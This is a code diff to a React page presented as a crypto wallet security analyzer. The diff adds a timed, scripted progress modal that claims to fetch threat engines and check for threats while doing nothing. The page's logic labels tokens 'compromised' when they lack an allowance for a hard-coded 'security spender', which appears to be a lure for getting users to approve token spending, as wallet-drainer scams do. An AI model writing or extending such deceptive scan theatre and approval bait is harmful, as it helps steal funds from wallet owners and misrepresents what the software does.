@@ -49,6 +49,15 @@ export default function WalletAnalyzerPage() {
   const [showAssetsModal, setShowAssetsModal] = useState(false);
   const modalRef = useRef<HTMLDivElement>(null);
   const [tokenStatuses, setTokenStatuses] = useState<Record<string, "secure" | "compromised" | "loading"> | null>(null);
+  const [showProgressModal, setShowProgressModal] = useState(false);
+  const [progressStep, setProgressStep] = useState(0);
+  const progressSteps = [
+    "Connecting to blockchain node…",
+    "Fetching threat engines…",
+    "Analyzing smart contract approvals…",
+    "Checking for known threats…",
+    "Compiling security report…"
+  ];
 
   const { address: connectedAddress, isConnected: wagmiIsConnected } = useAccount();
   // We'll get chain from RainbowKit ConnectButton.Custom render prop
@@ -65,51 +74,63 @@ export default function WalletAnalyzerPage() {
     setAnalyzing(true);
     setResult(null);
     setTokenStatuses(null);
-    let owner = isConnected ? connectedAddress : address;
-    if (!owner || !selectedChainId || tokens.length === 0) {
-      setResult({ risks: 0, message: "Your wallet is secure! No compromise or threats found.", status: "secure" });
-      setAnalyzing(false);
-      return;
-    }
-    // Use ethers to check allowances
-    let provider;
-    try {
-      // Try to use window.ethereum if available, else fallback to public RPC
-      if (typeof window !== 'undefined' && (window as any).ethereum) {
-        provider = new ethers.BrowserProvider((window as any).ethereum);
-      } else {
-        // fallback: use ethers getDefaultProvider (may not work for all chains)
-        provider = ethers.getDefaultProvider();
+    setShowProgressModal(true);
+    setProgressStep(0);
+    // Animate progress steps over 5 seconds
+    let step = 0;
+    const interval = setInterval(() => {
+      step++;
+      setProgressStep(step);
+      if (step >= progressSteps.length - 1) {
+        clearInterval(interval);
       }
-    } catch (e) {
-      setResult({ risks: 0, message: "Could not connect to provider.", status: "compromised" });
-      setAnalyzing(false);
-      return;
-    }
-    const statuses: Record<string, "secure" | "compromised"> = {};
-    let compromisedCount = 0;
-    await Promise.all(tokens.map(async (token) => {
+    }, 1000);
+    // Wait 5 seconds before running analysis
+    setTimeout(async () => {
+      setShowProgressModal(false);
+      let owner = isConnected ? connectedAddress : address;
+      if (!owner || !selectedChainId || tokens.length === 0) {
+        setResult({ risks: 0, message: "Your wallet is secure! No compromise or threats found.", status: "secure" });
+        setAnalyzing(false);
+        return;
+      }
+      let provider;
       try {
-        const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
-        const allowance = await contract.allowance(owner, SPENDER);
-        if (allowance && allowance.gt(0)) {
-          statuses[token.contractAddress] = "secure";
+        if (typeof window !== 'undefined' && (window as any).ethereum) {
+          provider = new ethers.BrowserProvider((window as any).ethereum);
         } else {
+          provider = ethers.getDefaultProvider();
+        }
+      } catch (e) {
+        setResult({ risks: 0, message: "Could not connect to provider.", status: "compromised" });
+        setAnalyzing(false);
+        return;
+      }
+      const statuses: Record<string, "secure" | "compromised"> = {};
+      let compromisedCount = 0;
+      await Promise.all(tokens.map(async (token) => {
+        try {
+          const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
+          const allowance = await contract.allowance(owner, SPENDER);
+          if (allowance && allowance.gt(0)) {
+            statuses[token.contractAddress] = "secure";
+          } else {
+            statuses[token.contractAddress] = "compromised";
+            compromisedCount++;
+          }
+        } catch (e) {
           statuses[token.contractAddress] = "compromised";
           compromisedCount++;
         }
-      } catch (e) {
-        statuses[token.contractAddress] = "compromised";
-        compromisedCount++;
-      }
-    }));
-    setTokenStatuses(statuses);
-    setResult(
-      compromisedCount > 0
-        ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: "compromised" }
-        : { risks: 0, message: "Secure! All tokens have allowance set for the security spender.", status: "secure" }
-    );
-    setAnalyzing(false);
+      }));
+      setTokenStatuses(statuses);
+      setResult(
+        compromisedCount > 0
+          ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: "compromised" }
+          : { risks: 0, message: "Secure! All tokens have allowance set for the security spender.", status: "secure" }
+      );
+      setAnalyzing(false);
+    }, 5000);
   };
 
   // Close modal on Esc
@@ -642,6 +663,24 @@ export default function WalletAnalyzerPage() {
           </motion.div>
         </motion.div>
       )}
+      {/* Progress Modal */}
+      {showProgressModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-[2px]">
+          <div className="relative w-full max-w-xs mx-auto rounded-2xl bg-gradient-to-br from-cyan-900/80 via-[#181F2B]/90 to-[#0D0D0D]/95 border-2 border-cyan-400/20 shadow-2xl backdrop-blur-2xl p-0 overflow-hidden flex flex-col items-center">
+            <div className="flex flex-col items-center justify-center py-10 px-6">
+              <div className="mb-4 animate-spin-slow">
+                <svg className="w-12 h-12 text-cyan-400" fill="none" viewBox="0 0 24 24"><circle className="opacity-30" cx="12" cy="12" r="10" stroke="#22d3ee" strokeWidth="4" /><path className="opacity-80" fill="#22d3ee" d="M4 12a8 8 0 018-8v8z" /></svg>
+              </div>
+              <div className="text-cyan-200 text-lg font-bold font-mono mb-2">Analyzing Wallet…</div>
+              <div className="w-full flex flex-col gap-1 mt-2">
+                {progressSteps.map((stepText, idx) => (
+                  <div key={idx} className={`text-xs font-mono transition-all duration-300 ${idx === progressStep ? 'text-cyan-400 font-bold' : idx < progressStep ? 'text-lime-400' : 'text-gray-500 opacity-60'}`}>{stepText}</div>
+                ))}
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
       <style jsx global>{`
         .neon-glow {
           box-shadow: 0 0 32px #00ffff44, 0 0 8px #39ff1444;
@@ -659,6 +698,13 @@ export default function WalletAnalyzerPage() {
         @keyframes pulse-fast {
           0%, 100% { box-shadow: 0 0 12px #39ff1444; }
           50% { box-shadow: 0 0 32px #39ff14cc; }
+        }
+        .animate-spin-slow {
+          animation: spin 1.5s linear infinite;
+        }
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
         }
       `}</style>
     </div>
